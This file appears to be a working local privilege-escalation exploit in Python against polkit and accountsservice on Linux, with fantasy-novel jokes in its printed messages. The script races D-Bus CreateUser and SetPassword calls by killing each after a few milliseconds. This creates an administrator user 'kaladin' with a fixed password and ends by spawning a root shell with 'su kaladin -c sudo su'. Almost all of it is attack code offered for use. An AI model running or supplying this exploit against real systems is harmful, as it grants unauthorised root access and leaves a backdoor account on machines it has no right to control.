import os, sys, time, subprocess, random, pwd

attempt = 0
creatingUser = True

print("Shit the battlefield odium has turned the alethi army against you!  Dalinar wtf you gonna do now!")

while creatingUser:

	#starting dbus process for polkit

	attempt += 1
	createUserProc = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply','/org/freedesktop/Accounts','org.freedesktop.Accounts.CreateUser','string:kaladin','string:"Kaladin Stormblessed','int32:1'])

	try:

    	#killing the message while poljit is still processing request

		Random = random.uniform(0.006,0.009)
		createUserProc.wait(timeout=Random)
		createUserProc.kill()

	except subprocess.TimeoutExpired:
    	
    	#killing the message even if error occurs
		createUserProc.kill()


    # verifiying exploit went through and checking for user kaladin
	user = subprocess.run(['id', 'kaladin'], stdout=subprocess.PIPE).stdout.decode('utf-8')

	if user.find("uid") != -1:
		print("[+] Dalinar has summoned honor's perpendicularity!")
		print("[+] Kaladin Stormblessed has just arrived on the battlefield")
		creatingUser = False
		break

	if attempt > 2000:
		print("[-] Damn Son Kaladin is still stuck in shadesmar sucks to suck")
		sys.exit(0)

for _ in range(200):

	uid = "/org/freedesktop/Accounts/User"+str(pwd.getpwnam('kaladin').pw_uid)

	password = "string:I will protect those who can not protect themselves"
	

	setPasswordProc = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply',uid,'org.freedesktop.Accounts.User.SetPassword',password,'string:GoldenEye'])
	
	try:
    		
    		Random = random.uniform(0.006,0.009)

    		setPasswordProc.wait(timeout=Random)
    		setPasswordProc.kill()

	except subprocess.TimeoutExpired:

    		setPasswordProc.kill()

print("[+] Be Happy the knights radiant have saved the day you got root now! ")
print("[+] 'The most important step you can take is not the first, its always the next.\nIt can not be a journey if there was no beginning!' -Dalinar Kholin")

p = subprocess.call("(su kaladin -c 'sudo su')", shell=True)
